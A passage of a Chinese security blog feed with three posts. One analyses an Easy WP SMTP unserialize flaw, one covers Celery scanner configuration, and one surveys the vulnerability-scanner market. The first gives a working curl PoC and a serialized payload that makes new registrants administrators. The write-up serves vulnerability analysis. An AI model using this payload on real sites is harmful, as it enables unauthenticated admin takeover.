&lt;p&gt;&lt;a href=&quot;https://laravel.com/docs/5.8/validation#rule-unique&quot;&gt;说明文档&lt;/a&gt;&lt;/p&gt;</content><author><name>HellSec</name></author><category term="bug" /><summary type="html">PHP开发框架Laravel，前几天在官方博客通报了一个SQL注入漏洞，这里简单分析下。</summary></entry><entry><title type="html">WordPress Easy WP SMTP反序列化漏洞分析</title><link href="/bug/2019/03/24/unserialize-vuln-for-wp-plugin-easy-wp-smtp/" rel="alternate" type="text/html" title="WordPress Easy WP SMTP反序列化漏洞分析" /><published>2019-03-24T16:31:21+08:00</published><updated>2019-03-24T16:31:21+08:00</updated><id>/bug/2019/03/24/unserialize-vuln-for-wp-plugin-easy-wp-smtp</id><content type="html" xml:base="/bug/2019/03/24/unserialize-vuln-for-wp-plugin-easy-wp-smtp/">&lt;p&gt;
	&lt;span style=&quot;color:#DAA520;&quot;&gt;&lt;strong&gt;Wordpress插件Easy WP SMTP最近新出了个漏洞，以前有关注过，好像新的代码变化有点大，所以这里花了点时间简单分析下。&lt;/strong&gt;&lt;/span&gt;
&lt;/p&gt;

&lt;p&gt;首先，这个漏洞存在于版本v1.3.9。 我这里能下到最接近的老版本是v1.3.8，可惜v1.3.9更迭了一些重要代码，我找到的版本，应该不能复现这个漏洞。
下面我会根据网上一些细节进行分析，没耐心的大佬可以直接跳到最后看原版的分析。&lt;/p&gt;

&lt;p&gt;关键函数位置在：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wp-content/plugins/easy-wp-smtp/easy-wp-smtp.php::admin_init
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;这里的函数，可以在用户登入admin界面时进行hook，本来是用来查看删除日志，导入/删除/更新数据库里的配置的。&lt;/p&gt;

&lt;p&gt;然而他这里没有对用户权限做严格的验证，甚至没有认证过的游客一样可以触发这个漏洞。
/wp-admin/admin.php的注释里对admin_init解释道：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Note, this does not just run on user-facing admin screens. It runs on admin-ajax.php and admin-post.php as well.
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;我们这里在admin-ajax.php处，为了触发漏洞，发送了action=swpsmtp_clear_log的ajax交互请求：&lt;/p&gt;

&lt;p&gt;网上给出的poc：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ curl https://VICTIM.COM/wp-admin/admin-ajax.php -F 'action=swpsmtp_clear_log' -F 'swpsmtp_import_settings=1' -F 'swpsmtp_import_settings_file=@/tmp/upload.txt'

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;网上的poc是利用函数中的一个导入配置文件的功能：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$in_raw = file_get_contents( $_FILES[ 'swpsmtp_import_settings_file' ][ 'tmp_name' ] );
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;在导入以后，他会对文件内容进行一个反序列化解析：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$in = unserialize( $in_raw );
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;我们可以使用下面的array:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;users_can_register&quot;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;]=&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;string(1)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;1&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;default_role&quot;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;]=&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;string(13)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;administrator&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;序列化以后成为：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&quot;a:2:{s:18:&quot;users_can_register&quot;;s:1:&quot;1&quot;;s:12:&quot;default_role&quot;;s:13:&quot;administrator&quot;;}&quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;再次组合array：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;data&quot;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;]=&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;string(81)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;a:2:{s:18:&quot;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;users_can_register&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;;s:1:&quot;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;;s:12:&quot;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;default_role&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;;s:13:&quot;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;administrator&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;;}&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;checksum&quot;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;]=&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;string(32)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;3ce5fb6d7b1dbd6252f4b5b3526650c8&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;第二次序列化后，将下面的结果，存入我们要上传的文件/tmp/upload.txt里：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;a:2:{s:4:&quot;data&quot;;s:81:&quot;a:2:{s:18:&quot;users_can_register&quot;;s:1:&quot;1&quot;;s:12:&quot;default_role&quot;;s:13:&quot;administrator&quot;;}&quot;;s:8:&quot;checksum&quot;;s:32:&quot;3ce5fb6d7b1dbd6252f4b5b3526650c8&quot;;}
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;简单说下，为何要这么构造呢，因为我们的插件代码里有这么一段：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$in = unserialize( $in_raw );
if ( empty( $in[ 'data' ] ) ) {
	 echo $err_msg;
	 wp_die();
}
if ( empty( $in[ 'checksum' ] ) ) {
	 echo $err_msg;
	 wp_die();
}
if ( md5( $in[ 'data' ] ) !== $in[ 'checksum' ] ) {
	 echo $err_msg;
	 wp_die();
}
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;我们可以看到，需要绕过两个部分：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;unserialize( $in_raw );
unserialize( $in['data'] )
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;经过两次反序列化的结果后，data的内容，也就是下面的数组：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;users_can_register&quot;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;]=&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;string(1)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;1&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;default_role&quot;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;]=&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;string(13)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;administrator&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;才能分拆为key-value，进入后续函数：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;foreach ( $data as $key =&amp;gt; $value ) 
{
	    update_option( $key, $value );
}
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;users_can_register是配置的注册启用选项，default_role是默认普通权限，administrator是管理权限。
到这里就明了了，开启注册后，我们注册的普通用户都是管理权限，没必要去取原来的管理密码，反正也解不出来…&lt;/p&gt;

&lt;p&gt;下面我们可以跟到更新数据库配置的位置，这就已经到主branch了：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/wp-includes/option.php::update_option
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;我们可以看到，里面的key，value的值经过下面的函数过滤，对序列化和拼接做了限制，再者使用的$wpdb进行sql执行update，可以操作的地方就比较有限了：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$value = apply_filters( &quot;pre_update_option_{$option}&quot;, $value, $old_value, $option );
$value = apply_filters( 'pre_update_option', $value, $option, $old_value );
	
if ( $value === $old_value || maybe_serialize( $value ) === maybe_serialize( $old_value ) ) 
{
	return false;
}

$result = $wpdb-&amp;gt;update( $wpdb-&amp;gt;options, $update_args, array( 'option_name' =&amp;gt; $option ) );
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;附上数据库wp_options表查询的最初始的默认结果：
&lt;img src=&quot;http://ww1.sinaimg.cn/large/697f6f27ly1g1agtwdr61j210i0dujsn.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;本文可能略显啰嗦，只是为了给小白解释的清楚些，大佬们见谅。&lt;/p&gt;

&lt;p&gt;引用文章：&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://blog.nintechnet.com/critical-0day-vulnerability-fixed-in-wordpress-easy-wp-smtp-plugin/&quot;&gt;Critical zero-day vulnerability fixed in WordPress Easy WP SMTP plugin.&lt;/a&gt;&lt;/p&gt;</content><author><name>HellSec</name></author><category term="bug" /><summary type="html">Wordpress插件Easy WP SMTP最近新出了个漏洞，以前有关注过，好像新的代码变化有点大，所以这里花了点时间简单分析下。</summary></entry><entry><title type="html">分布式扫描填坑杂谈</title><link href="/scanner/2019/01/15/talk-about-scanner-settings/" rel="alternate" type="text/html" title="分布式扫描填坑杂谈" /><published>2019-01-15T15:49:21+08:00</published><updated>2019-01-15T15:49:21+08:00</updated><id>/scanner/2019/01/15/talk-about-scanner-settings</id><content type="html" xml:base="/scanner/2019/01/15/talk-about-scanner-settings/">&lt;p&gt;
	&lt;span style=&quot;color:#00B050;&quot;&gt;&lt;strong&gt;前段时间团队新加了几台服务器，因为现行的扫描器是支持分布式的，所以及时进行了分布式部署。结果在调试分布式配置时，还是遇到许多坑，忙完一阵子闲下来了，正好整理下记录。&lt;/strong&gt;&lt;/span&gt;
&lt;/p&gt;

&lt;p&gt;在本文中，将简单谈谈我这边采用的技术栈，有关对分布式填坑的经历，大家注意这里依旧是采用的python code。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;celery库版本&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;以root权限启动root的问题，低版本不识别，会报错，这里使用的是celery==3.1.2x。&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;from celery import Celery, platforms
platforms.C_FORCE_ROOT = True

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;redis库版本&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;版本不合适，或者worker和server版本不对等的话，可能出现celery worker 开启不久就offline的问题，或者redis会不时的掉线重连。&lt;/p&gt;

&lt;p&gt;这里把redis库的版本，从原来的redis==3.0.x降级到redis==2.10.x，基本解决了上述bug。&lt;/p&gt;

&lt;p&gt;需要注意的是，在celery高版本的时候（比如4.x），可能会需要匹配3.x的redis库，大家看情况而定。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;重连机制&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;我们这里在后端存储结果，考虑到复杂sql交叉调用，还是采用的关系数据库mysql。&lt;/p&gt;

&lt;p&gt;局域网中数据库写入，需要考虑重连机制，常用的如MySQLdb库，原生无重连机制，需要自己重写。&lt;/p&gt;

&lt;p&gt;这里推荐两个模块，都支持重连：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;torndb
facebook开源的一个基于MySQLdb二次封装的一个mysql模块。
pymysql
比较常用，需要python3。
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;加强存取稳定性&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;如果想要加强局域网数据存取的稳定性，除了把上述的超时和重连配置好以外，暂时有两个办法：&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;第一：可以将存入局域网数据库服务器失败的数据，暂存本地关系数据库。采用定时调度器，或者监控网络空闲时，再进行同步
。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;第二：可以将命令或者数据直接写入本地中间件，当监控到网络空闲时间，自动同步。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;另外，笔者这方面经验比较浅，欢迎运维大佬和coding大佬多多指教下这一块儿有没有其他可优化的点。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;局域网调试&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;检测网络状态，可以看出ping其他worker是通的：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; app = Celery('test', backend='redis://random_host:6379/0', broker='redis://random_host:6379/0')
&amp;gt;&amp;gt;&amp;gt; app.control.ping(timeout=0.5)

[{'worker1.example.com': 'pong'},
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;查看时区差异:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; from celery.utils.timeutils import utcoffset
&amp;gt;&amp;gt;&amp;gt; utcoffset()

0
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;库版本不同步等原因，可能造成worker和server的时间不同步。而且时间不同步，似乎会导致celery的超时机制不可用。&lt;/p&gt;

&lt;p&gt;我们可以安装ntp服务，自动更新时间，同步server和worker的指定python库版本，示例命令如下【每个系统情况不一定适用】：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;apt-get install ntp
service ntp start
#手动更新时间
date -R

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;监控woker状态的一些点，可以参考这篇文章：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;https://fangchichen.github.io/fangchichen.github.io/2018/08/08/celery%E5%87%BA%E7%8E%B0worker%E5%BC%82%E5%B8%B8offline%E6%83%85%E5%86%B5/
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;celery关键配置&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;还是那句话，各系统情况不同，
这里仅仅贴出几个关键点,大家觉得可以优化的地方可以讨论下：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#任务预取功能，就是每个工作的进程／线程在获取任务的时候，会尽量多拿 n 个，以保证获取的通讯成本可以压缩。
CELERYD_PREFETCH_MULTIPLIER = 1

#这个表示每个工作的进程／线程 在执行 n 次任务后，主动销毁，之后会起一个新的，主要解决一些资源释放的问题。
CELERYD_MAX_TASKS_PER_CHILD = 1

#不存取返回结果，加快响应速度。
CELERY_IGNORE_RESULT=False

#该配置可以保证task不丢失，中断的task在下次启动时将会重新执行。
TASK_REJECT_ON_WORKER_LOST = True
#不会多拿任务，只有当worker完成了这个task时，任务才被标记为ack状态。
#只有当worker完成了这个task时，任务才被标记为ack状态
CELERY_ACKS_LATE = True

#解决时区同步问题
CELERY_TIMEZONE = 'Asia/Shanghai'
CELERY_ENABLE_UTC = True
USE_TZ = True

#broker的连接超时时间。
BROKER_CONNECTION_TIMEOUT = 20

#如果确认是因为当前worker的并发是prefork（多进程）,并且可能是由于死锁原因造成，4.0之后的版本不支持。
CELERYD_FORCE = True

#任务超时会分配给其他worker
BROKER_TRANSPORT_OPTIONS = {'visibility_timeout': 3600}

#禁用所有速度限制，如果网络资源有限，不建议开足马力。
#CELERY_DISABLE_RATE_LIMITS = True
#CELERY_ACKS_LATE = True
#CELERY_IGNORE_RESULT = True

#这个表示保存任务结果的时长，这个时间会被设置到 backend 里面
#CELERY_TASK_RESULT_EXPIRES = 3600

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;celery命令行参数&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Queue还是建议启用的，方便清空，也方便指定queuename运行特定任务。
比如配置文件里这么写:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;CELERY_QUEUES = (
            Queue('default', Exchange('default'), routing_key='default'),
            Queue('wakaka', Exchange('wakaka'), routing_key='wakaka'),
            )
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;那么，命令行可以这么输入：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;celery -A test worker -E -l INFO -n workername -Q wakaka --concurrency=4
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;注意，–concurrency的值是并发进程数，这是由你的CPU个数决定性能的，不要设太高。&lt;/p&gt;

&lt;p&gt;win下的话，在高版本celery 4.x，默认的是prefork，报错解决方法如下：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;pip install eventlet
celery -A proj worker -l info -P eventlet

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;最后，建议大家不要在win下运行celery，似乎4.x以后某个版本已经放弃支持，而且win下有很多坑没法填。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;任务调度框架&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;关于任务调度这一块儿，除了celery，感觉dramatiq和rq的坑会少些，以后会抽空来谈谈。&lt;/p&gt;

&lt;h3 id=&quot;结语&quot;&gt;结语&lt;/h3&gt;

&lt;p&gt;以上配置和分析内容，是摸索和查资料得来的，感谢前辈们的开源共享。&lt;/p&gt;</content><author><name>HellSec</name></author><category term="scanner" /><summary type="html">前段时间团队新加了几台服务器，因为现行的扫描器是支持分布式的，所以及时进行了分布式部署。结果在调试分布式配置时，还是遇到许多坑，忙完一阵子闲下来了，正好整理下记录。</summary></entry><entry><title type="html">漫谈漏洞扫描</title><link href="/scanner/2018/12/27/talk-about-scanner-roads/" rel="alternate" type="text/html" title="漫谈漏洞扫描" /><published>2018-12-27T16:42:38+08:00</published><updated>2018-12-27T16:42:38+08:00</updated><id>/scanner/2018/12/27/talk-about-scanner-roads</id><content type="html" xml:base="/scanner/2018/12/27/talk-about-scanner-roads/">&lt;p&gt;
	&lt;span style=&quot;color:#DAA520;&quot;&gt;&lt;strong&gt;研究漏扫这块儿有段时间了，虽然是业余自己玩，但平素跟公司漏扫产品线打交道比较多，稍微有些心得，在这里简单分享下。&lt;/strong&gt;&lt;/span&gt;
&lt;/p&gt;

&lt;h3 id=&quot;企业级漏扫&quot;&gt;企业级漏扫&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;盒子扫描器&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;对于漏扫产品的话，部分甲方单位会按公安那边的标准，在内网部署一些盒子扫描器（硬件服务器+扫描软件）。&lt;/p&gt;

&lt;p&gt;说实话，这玩意儿定位是比较尴尬的，虽然大的单位每年有一定的采购指标。但是有时候还是会听产品经理吐槽，每次实在卖不出量，可能一单安全服务生意卖出个一两台就不错了。&lt;/p&gt;

&lt;p&gt;当然，现在漏扫一般会配合漏洞管理、网站监控等产品一起卖。为了覆（tong）盖（hang）产（jing）品（zheng）线，给售前和销售操控的空间，这款产品还是必须要的。&lt;/p&gt;

&lt;p&gt;卖漏扫盒子的利润还算可观，只要销售和渠道给力，传统乙方还是愿意做的这门生意的。&lt;/p&gt;

&lt;p&gt;代表厂商有:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sangfor
venus
nsfocus
topsec
...
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;在线漏扫服务&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;在线漏扫的话，一般难以对内网进行检测。大多数的操作是，在验证外网某站的所有权后，再签协议授权扫描。不过由于成本较盒子更加低廉，容易受到中小厂商的追捧。&lt;/p&gt;

&lt;p&gt;当然，如果内网也需要享受这样的服务的话，自然还是需要安服人员带着盒子，或者类似封装好的扫描器，在企业单位进行驻场检测。&lt;/p&gt;

&lt;p&gt;代表厂商有:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;360
knownsec
...
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;ul&gt;
  &lt;li&gt;定制漏扫&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;据笔者所知，部分云服务厂商，会对云服务客户提供了定制漏扫服务。&lt;/p&gt;

&lt;p&gt;由于是自家的服务器，自然对客户的业务具有一定的了解。无论是做漏扫，还是做资产监控还是态势感知，都是相对容易的。&lt;/p&gt;

&lt;p&gt;云服务厂商在对这部分客户做漏扫时，由于统一的架构部署，安服漏扫会比较精确和有效。貌似这样的漏扫服务，一般不会对外开放，算是定制的服务。&lt;/p&gt;

&lt;p&gt;顺便提一句，部分漏洞平台，好像对于大客户也推出了一条龙服务，其中是包括定制漏扫的。&lt;/p&gt;

&lt;p&gt;代表云厂商有:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;alibaba
tencent
kingsoft
riskivy
...
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;免费商业漏扫&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;市面上也出现了部分优秀的商业级别漏扫，咱们这里先别讨论是免费版还是破解版。&lt;/p&gt;

&lt;p&gt;正是有了这些漏扫产品，在驻场和分公司的苦逼兼职的安服人员，才有了一口饭吃【纯吐槽公司制度】。&lt;/p&gt;

&lt;p&gt;这里解释下，因为公司内部的漏扫产品，不是分驻地都能拿到授权的，那最后怎么办呢？用破解的。效果不好咋办？换其他家的破解或者免费产品。&lt;/p&gt;

&lt;p&gt;代表产品有：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;AWVS
nessus
arachni
metasploit
sqlmap
burpsuite
appscan
netsparker
...
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;开源漏扫&quot;&gt;开源漏扫&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;社区级漏扫&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;这些产品一般是社区或者团队在维护的，一般为乙方渗透人员或者Bug Bounty人员所用。&lt;/p&gt;

&lt;p&gt;一旦他们需要对企业机构，或者政府单位进行渗透测试时，可以根据情况，部署分布式节点扫描，加快漏扫速度。&lt;/p&gt;

&lt;p&gt;笔者依稀记得曾经的bugscan，好像大家都可以接入公网节点。这听起来，其实有点像以前的迅雷p2p，可以加速所有运行的任务。&lt;/p&gt;

&lt;p&gt;不过后来好像由于各种原因，部分人搞到了源码和payload包，自己玩起了单机。多台外网VPS一部署，扫起东西来也是美滋滋，亲测出结果还是比较快的。&lt;/p&gt;

&lt;p&gt;不过这种漏扫有个坏处就是，一旦社区不用心再维护，渐渐就没有人再提交payload，毕竟单个漏洞的生命周期还是不长的。&lt;/p&gt;

&lt;p&gt;当然，这种产品还有个去路，就是实现企业化。&lt;/p&gt;

&lt;p&gt;一旦变成企业级产品，就会有更多的资源投入去维护它，自然能更好的发展下去。&lt;/p&gt;

&lt;p&gt;比较可惜的是，升级后的版本以及payload，自然大多数就不会再开源了。&lt;/p&gt;

&lt;p&gt;代表产品有：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bugscan
蚁逅
tangscan
Beebeeto
Pocscan
Osprey「鱼鹰」
...
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;综合扫描&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;由于各种脚本语言的兴起，大幅减少了coding的难度和时间，网络上涌现出一批由团队或个人维护的综合扫描器。&lt;/p&gt;

&lt;p&gt;虽然得吐槽下，大多数质量良莠不齐，造轮子的比较多，而且后续长期作者维护的比较少，不过其中不乏优秀的个体。&lt;/p&gt;

&lt;p&gt;综合扫描定义比较模糊，一般除了exp检测和CMS识别外，还有部分项目加入了路径爆破、资产统计、端口扫描等功能。&lt;/p&gt;

&lt;p&gt;不过让人稍稍有点失望的是，这类综合扫描可能大同小异，暂时没有发现特别亮眼的点。&lt;/p&gt;

&lt;p&gt;在笔者过往的系列文章中，也谈过部分关于综合扫描器细节，这里不再细说。&lt;/p&gt;

&lt;p&gt;代表产品有:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;w9scan
AngelSword
fenghuangscanner
猪猪侠PPT中提过的扫描器
...
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;Gui扫描&lt;/li&gt;
&lt;/ul&gt;

